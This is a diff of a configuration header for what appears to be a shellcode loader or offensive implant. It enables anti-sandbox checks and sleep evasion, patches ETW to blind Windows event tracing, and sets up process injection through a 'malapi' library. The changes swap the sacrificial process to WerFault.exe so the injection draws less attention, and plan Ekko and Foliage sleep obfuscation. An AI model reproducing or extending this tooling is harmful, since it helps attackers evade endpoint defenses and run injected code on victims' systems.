@@ -10,7 +10,12 @@
 #define ANTI_SANDBOX_ENABLED 1
 #define SLEEP_ENABLED 1
 
-#define SLEEP_TIME 40000
+//
+// TODO:
+// Add Ekko
+// Add Foliage
+//
+#define SLEEP_TIME 1000
 #define SLEEP_METHOD 1
 #if SLEEP_METHOD == 1
 #define SleepMethod(sleep_time) malapi::SleepMs(sleep_time)
@@ -19,7 +24,7 @@
 // Patching
 #define PATCH_ENABLED_ETW 1
 
-#define PATCH_METHOD_ETW 2
+#define PATCH_METHOD_ETW 1
 #if PATCH_METHOD_ETW == 1
 #define PatchEtw(void) malapi::PatchEtwSsn(void)
 #elif PATCH_METHOD_ETW == 2
@@ -98,10 +103,11 @@ unsigned char key[] = {
 // 3 - Existing Process
 //
 #define CONFIG_CREATE_PROCESS_METHOD 1
-#define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\notepad.exe"
+#define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\WerFault.exe"
+//#define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\notepad.exe"
 
 // Execution Methods
-#define CONFIG_EXECUTION_METHOD 4
+#define CONFIG_EXECUTION_METHOD 2
 
 #if CONFIG_EXECUTION_METHOD == 1
 #define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionCreateRemoteThread(phandle, shellcode, shellcode_len, ahandle)
